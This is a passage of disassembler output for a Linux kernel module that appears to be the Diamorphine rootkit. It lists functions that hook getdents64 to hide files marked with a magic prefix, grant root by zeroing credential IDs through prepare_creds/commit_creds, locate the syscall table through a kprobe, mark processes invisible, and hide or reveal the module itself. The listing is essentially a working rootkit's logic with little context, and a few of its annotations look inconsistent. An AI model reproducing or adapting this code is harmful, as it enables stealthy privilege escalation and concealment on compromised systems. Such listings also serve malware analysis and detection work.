│ ╎╎╎││││   0x080005ac      488b7dd0       mov rdi, qword [var_30h]
│ ╎╎╎││││   0x080005b0      4889da         mov rdx, rbx
│ ╎╎╎││││   0x080005b3      4c89fe         mov rsi, r15
│ ╎╎╎││││   0x080005b6      e800000000     call _copy_to_user          ; linux-headers-5.15.0-82-generic:230; RELOC 32 _copy_to_user
│ ╎╎╎││││   ; CALL XREFS from sym.hacked_getdents64 @ 0x80004c8(x), 0x80005b6(x)
│ ╎╎╎││││   ; CODE XREF from reloc.memmove @ +0x19(x)
│ ╎╎╎││└──> 0x080005bb      4c89ff         mov rdi, r15
│ ╎╎╎││ │   0x080005be      e800000000     call kfree                  ; RELOC 32 kfree
│ ╎╎╎││ │   ; CALL XREF from sym.hacked_getdents64 @ 0x80005be(x)
│ ╎╎╎││ │   0x080005c3      4889d8         mov rax, rbx
│ ╎╎╎││ │   0x080005c6      4883c410       add rsp, 0x10               ; linux-headers-5.15.0-82-generic:68
│ ╎╎╎││ │   0x080005ca      5b             pop rbx
│ ╎╎╎││ │   0x080005cb      415c           pop r12
│ ╎╎╎││ │   0x080005cd      415d           pop r13                     ; linux-headers-5.15.0-82-generic:61
│ ╎╎╎││ │   0x080005cf      415e           pop r14
│ ╎╎╎││ │   0x080005d1      415f           pop r15                     ; linux-headers-5.15.0-82-generic:68
│ ╎╎╎││ │   0x080005d3      5d             pop rbp
│ ╎╎╎││┌──< 0x080005d4      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│ ╎╎╎││││   ; CODE XREFS from sym.hacked_getdents64 @ 0x8000528(x), 0x80005d4(x)
│ ╎╎╎└─└──> 0x080005d9      4c394b13       cmp qword [rbx + 0x13], r9
│ ────────< 0x080005dd      759e           jne 0x800057d               ; linux-headers-5.15.0-82-generic:69
│ ╎╎╎ │ │   0x080005df      807f0873       cmp byte [rdi + 8], 0x73    ; 's'
│ ────────< 0x080005e3      7598           jne 0x800057d
│ ╎╎╎ │ │   0x080005e5      4c39fb         cmp rbx, r15
│ ╎╎╎ │┌──< 0x080005e8      743b           je 0x8000625
│ ╎╎╎ │││   ; CODE XREF from sym.hacked_getdents64 @ 0x8000623(x)
│ ╎╎╎┌────> 0x080005ea      0fb74310       movzx eax, word [rbx + 0x10]
│ ╎╎╎╎│││   0x080005ee      6641014510     add word [r13 + 0x10], ax
│ ╎└──────< 0x080005f3      eb8b           jmp 0x8000580
│ ╎ ╎╎│││   ; CODE XREF from sym.hacked_getdents64 @ 0x8000470(x)
│ ╎ ╎╎││└─> 0x080005f5      4883c410       add rsp, 0x10               ; linux-headers-5.15.0-82-generic:73
│ ╎ ╎╎││    0x080005f9      4898           cdqe                        ; linux-headers-5.15.0-82-generic:86
│ ╎ ╎╎││    0x080005fb      5b             pop rbx
│ ╎ ╎╎││    0x080005fc      415c           pop r12
│ ╎ ╎╎││    0x080005fe      415d           pop r13
│ ╎ ╎╎││    0x08000600      415e           pop r14                     ; linux-headers-5.15.0-82-generic:90
│ ╎ ╎╎││    0x08000602      415f           pop r15
│ ╎ ╎╎││    0x08000604      5d             pop rbp
│ ╎ ╎╎││┌─< 0x08000605      e900000000     jmp __x86_return_thunk      ; linux-headers-5.15.0-82-generic:91; RELOC 32 __x86_return_thunk
│ ╎ ╎╎│││   ; CODE XREFS from sym.hacked_getdents64 @ 0x8000561(x), 0x8000605(x)
│ ──────└─> 0x0800060a      4885d2         test rdx, rdx
│ └───────< 0x0800060d      0f846affffff   je 0x800057d                ; linux-headers-5.15.0-82-generic:90
│   ╎╎││    0x08000613      f68077f7ff..   test byte [rax - 0x889], 0x10
│   └─────< 0x0800061a      0f845dffffff   je 0x800057d                ; linux-headers-5.15.0-82-generic:92
│    ╎││    0x08000620      4c39fb         cmp rbx, r15
│    └────< 0x08000623      75c5           jne 0x80005ea
│     ││    ; CODE XREF from sym.hacked_getdents64 @ 0x80005e8(x)
│     │└──> 0x08000625      410fb75710     movzx edx, word [r15 + 0x10]
│     │     0x0800062a      4c89ff         mov rdi, r15
│     │     0x0800062d      448945cc       mov dword [var_34h], r8d
│     │     0x08000631      4129d6         sub r14d, edx
│     │     0x08000634      498d3417       lea rsi, [r15 + rdx]
│     │     0x08000638      4963de         movsxd rbx, r14d
│     │     0x0800063b      4889da         mov rdx, rbx
│     │     0x0800063e      e800000000     call memmove                ; RELOC 32 memmove
│     │     ; CALL XREF from sym.hacked_getdents64 @ 0x800063e(x)
│     │     0x08000643      448b45cc       mov r8d, dword [var_34h]
│     │     0x08000647      49b9707379..   movabs r9, 0x69736f6863797370 ; 'psychosi'
│ ────────< 0x08000651      e934ffffff     jmp 0x800058a
│     │     ; CODE XREF from sym.hacked_getdents64 @ 0x8000596(x)
└     └───> 0x08000656      0f0b           ud2
┌ 80: sym.give_root ();
│           0x08000740      e800000000     call __fentry__             ; RELOC 32 __fentry__
│           ; CALL XREF from sym.give_root @ 0x8000740(x)
│           0x08000745      55             push rbp
│           0x08000746      4889e5         mov rbp, rsp
│           0x08000749      e800000000     call prepare_creds          ; RELOC 32 prepare_creds
│           ; CALL XREF from sym.give_root @ 0x8000749(x)
│           0x0800074e      4885c0         test rax, rax
│       ┌─< 0x08000751      7428           je 0x800077b
│       │   0x08000753      48c7400400..   mov qword [rax + 4], 0
│       │   0x0800075b      4889c7         mov rdi, rax
│       │   0x0800075e      48c7400c00..   mov qword [rax + 0xc], 0
│       │   0x08000766      48c7401400..   mov qword [rax + 0x14], 0
│       │   0x0800076e      48c7401c00..   mov qword [rax + 0x1c], 0
│       │   0x08000776      e800000000     call commit_creds           ; RELOC 32 commit_creds
│       │   ; CALL XREFS from sym.give_root @ 0x8000751(x), 0x8000776(x)
│       └─> 0x0800077b      5d             pop rbp
│       ┌─< 0x0800077c      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│       │   ; CODE XREF from sym.give_root @ 0x800077c(x)
│       └─> 0x08000781      66662e0f1f..   nop word cs:[rax + rax]
└           0x0800078c      0f1f4000       nop dword [rax]
┌ 64: sym.get_syscall_table_bf ();
│ afv: vars(1:sp[0x10..0x10])
│           0x08000660      e800000000     call __fentry__             ; linux-headers-5.15.0-82-generic:92; RELOC 32 __fentry__
│           ; CALL XREF from sym.get_syscall_table_bf @ 0x8000660(x)
│           0x08000665      55             push rbp
│           0x08000666      48c7c70000..   mov rdi, 0                  ; RELOC 32 .data @ 0x08001080
│           0x0800066d      4889e5         mov rbp, rsp
│           0x08000670      53             push rbx
│           0x08000671      e800000000     call register_kprobe        ; RELOC 32 register_kprobe
│           ; CALL XREF from sym.get_syscall_table_bf @ 0x8000671(x)
│           0x08000676      48c7c70000..   mov rdi, 0                  ; RELOC 32 .data @ 0x08001080
│           0x0800067d      488b1d0000..   mov rbx, qword [0x08000684] ; [0x8000684:8]=0xc7c74800000000e8; RELOC 32 .data @ 0x08001080 - 0x800065c
│           ; DATA XREF from sym.get_syscall_table_bf @ 0x800067d(r)
│           0x08000684      e800000000     call unregister_kprobe      ; RELOC 32 unregister_kprobe
│           ; CALL XREF from sym.get_syscall_table_bf @ 0x8000684(x)
│           0x08000689      48c7c70000..   mov rdi, 0                  ; linux-headers-5.15.0-82-generic:108; RELOC 32 .rodata.str1.1 @ 0x08000982 + 0x26
│           0x08000690      e800000000     call __x86_indirect_thunk_rbx ; linux-headers-5.15.0-82-generic:111; RELOC 32 __x86_indirect_thunk_rbx
│           ; CALL XREF from sym.get_syscall_table_bf @ 0x8000690(x)
│           0x08000695      488b5df8       mov rbx, qword [var_8h]
│           0x08000699      c9             leave
│       ┌─< 0x0800069a      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│       │   ; CODE XREF from sym.get_syscall_table_bf @ 0x800069a(x)
└       └─> 0x0800069f      90             nop
┌ 64: sym.find_task ();
│           0x080006a0      e800000000     call __fentry__             ; linux-headers-5.15.0-82-generic:248; RELOC 32 __fentry__
│           ; CALL XREF from sym.find_task @ 0x80006a0(x)
│           0x080006a5      55             push rbp                    ; linux-headers-5.15.0-82-generic:255
│           0x080006a6      49c7c00000..   mov r8, 0                   ; RELOC 32 init_task
│           0x080006ad      4889e5         mov rbp, rsp
│       ┌─< 0x080006b0      eb08           jmp 0x80006ba
│       │   ; CODE XREF from sym.find_task @ 0x80006ce(x)
│      ┌──> 0x080006b2      39b808010000   cmp dword [rax + 0x108], edi
│     ┌───< 0x080006b8      7419           je 0x80006d3
│     │╎│   ; CODE XREF from sym.find_task @ 0x80006b0(x)
│     │╎└─> 0x080006ba      498b80b808..   mov rax, qword [r8 + 0x8b8]
│     │╎    0x080006c1      4c8d8048f7..   lea r8, [rax - 0x8b8]
│     │╎    0x080006c8      483d00000000   cmp rax, 0                  ; RELOC 32 init_task
│     │└──< 0x080006ce      75e2           jne 0x80006b2               ; linux-headers-5.15.0-82-generic:265
│     │     0x080006d0      4531c0         xor r8d, r8d
│     │     ; CODE XREF from sym.find_task @ 0x80006b8(x)
│     └───> 0x080006d3      4c89c0         mov rax, r8
│           0x080006d6      5d             pop rbp                     ; linux-headers-5.15.0-82-generic:272
│       ┌─< 0x080006d7      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│       │   ; CODE XREF from sym.find_task @ 0x80006d7(x)
└       └─> 0x080006dc      0f1f4000       nop dword [rax]
┌ 96: sym.is_invisible ();
│           0x080006e0      e800000000     call __fentry__             ; RELOC 32 __fentry__
│           ; CALL XREF from sym.is_invisible @ 0x80006e0(x)
│           0x080006e5      55             push rbp
│           0x080006e6      31c0           xor eax, eax
│           0x080006e8      48c7c20000..   mov rdx, 0                  ; RELOC 32 init_task
│           0x080006ef      4889e5         mov rbp, rsp
│           0x080006f2      85ff           test edi, edi
│       ┌─< 0x080006f4      750a           jne 0x8000700
│      ┌──< 0x080006f6      eb20           jmp 0x8000718
│      ││   ; CODE XREF from sym.is_invisible @ 0x8000714(x)
│     ┌───> 0x080006f8      3bb808010000   cmp edi, dword [rax + 0x108]
│    ┌────< 0x080006fe      741e           je 0x800071e
│    │╎││   ; CODE XREF from sym.is_invisible @ 0x80006f4(x)
│    │╎│└─> 0x08000700      488b82b808..   mov rax, qword [rdx + 0x8b8] ; linux-headers-5.15.0-82-generic:63
│    │╎│    0x08000707      488d9048f7..   lea rdx, [rax - 0x8b8]
│    │╎│    0x0800070e      483d00000000   cmp rax, 0                  ; RELOC 32 init_task
│    │└───< 0x08000714      75e2           jne 0x80006f8
│    │ │    ; CODE XREF from sym.is_invisible @ 0x8000721(x)
│    │ │┌─> 0x08000716      31c0           xor eax, eax
│    │ │╎   ; CODE XREF from sym.is_invisible @ 0x80006f6(x)
│    │ └──> 0x08000718      5d             pop rbp
│    │ ┌──< 0x08000719      e900000000     jmp __x86_return_thunk      ; linux-headers-5.15.0-82-generic:72; RELOC 32 __x86_return_thunk
│    │ │╎   ; CODE XREFS from sym.is_invisible @ 0x80006fe(x), 0x8000719(x)
│    └─└──> 0x0800071e      4885d2         test rdx, rdx
│       └─< 0x08000721      74f3           je 0x8000716
│           0x08000723      8b8074f7ffff   mov eax, dword [rax - 0x88c] ; linux-headers-5.15.0-82-generic:289
│           0x08000729      5d             pop rbp
│           0x0800072a      c1e81c         shr eax, 0x1c               ; linux-headers-5.15.0-82-generic:290
│           0x0800072d      83e001         and eax, 1
│       ┌─< 0x08000730      e900000000     jmp __x86_return_thunk      ; linux-headers-5.15.0-82-generic:294; RELOC 32 __x86_return_thunk
│       │   ; CODE XREF from sym.is_invisible @ 0x8000730(x)
└       └─> 0x08000735      66662e0f1f..   nop word cs:[rax + rax]     ; linux-headers-5.15.0-82-generic:295
┌ 83: sym.module_hide ();
│           0x080007d0      e800000000     call __fentry__             ; RELOC 32 __fentry__
│           ; CALL XREF from sym.module_hide @ 0x80007d0(x)
│           0x080007d5      488b050000..   mov rax, qword [0x080007dc] ; [0x80007dc:8]=0x5500000000158b48; RELOC 32 __this_module @ 0x08001100 - 0x80007cc
│           ; DATA XREF from sym.module_hide @ 0x80007d5(r)
│           0x080007dc      488b150000..   mov rdx, qword [0x080007e3] ; [0x80007e3:8]=0x5894855; RELOC 32 __this_module @ 0x08001100 - 0x80007db
│           ; DATA XREF from sym.module_hide @ 0x80007dc(r)
│           0x080007e3      55             push rbp
│           0x080007e4      4889050000..   mov qword [0x080007eb], rax ; [0x80007ea:8]=0xe589480842894800; RELOC 32 .bss @ 0x08001480 - 0x80007db
│           0x080007eb      48894208       mov qword [rdx + 8], rax
│           0x080007ef      4889e5         mov rbp, rsp
│           0x080007f2      488910         mov qword [rax], rdx
│           0x080007f5      5d             pop rbp
│           0x080007f6      48b8000100..   movabs rax, 0xdead000000000100
│           0x08000800      4889050000..   mov qword [0x08000807], rax ; [0x8000806:8]=0x5894822c0834800; RELOC 32 __this_module @ 0x08001100 - 0x80007ff
│           0x08000807      4883c022       add rax, 0x22               ; 34
│           0x0800080b      4889050000..   mov qword [0x08000812], rax ; [0x8000811:8]=0x896600000001b800; RELOC 32 __this_module @ 0x08001100 - 0x8000802
│           0x08000812      b801000000     mov eax, 1
│           0x08000817      6689050000..   mov word [0x0800081e], ax   ; [0x800081d:2]=0xe900; RELOC 32 .bss @ 0x08001480 - 0x8000816
└       ┌─< 0x0800081e      e900000000     jmp sym.diamorphine_init    ; RELOC 32 __x86_return_thunk
┌ 64: sym.module_show ();
│           0x08000790      e800000000     call __fentry__             ; RELOC 32 __fentry__
│           ; CALL XREF from sym.module_show @ 0x8000790(x)
│           0x08000795      488b050000..   mov rax, qword [0x0800079c] ; [0x800079c:8]=0x48e58948108b4855; RELOC 32 .bss @ 0x08001480 - 0x800078c
│           ; DATA XREF from sym.module_show @ 0x8000795(r)
│           0x0800079c      55             push rbp
│           0x0800079d      488b10         mov rdx, qword [rax]
│           0x080007a0      4889e5         mov rbp, rsp
│           0x080007a3      48c7420800..   mov qword [rdx + 8], 0      ; RELOC 32 __this_module @ 0x08001100 + 0x8
│           0x080007ab      4889050000..   mov qword [0x080007b2], rax ; [0x80007b1:8]=0x15894800; RELOC 32 __this_module @ 0x08001100 - 0x80007a2
│           0x080007b2      4889150000..   mov qword [0x080007b9], rdx ; [0x80007b8:8]=0xc74800; RELOC 32 __this_module @ 0x08001100 - 0x80007b1
│           0x080007b9      48c7000000..   mov qword [rax], 0          ; RELOC 32 __this_module @ 0x08001100 + 0x8
│           0x080007c0      31c0           xor eax, eax
│           0x080007c2      5d             pop rbp
│           0x080007c3      6689050000..   mov word [0x080007ca], ax   ; [0x80007c9:2]=0xe900; RELOC 32 .bss @ 0x08001480 - 0x80007c2
│       ┌─< 0x080007ca      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│       │   ; CODE XREF from sym.module_show @ 0x80007ca(x)
└       └─> 0x080007cf      90             nop
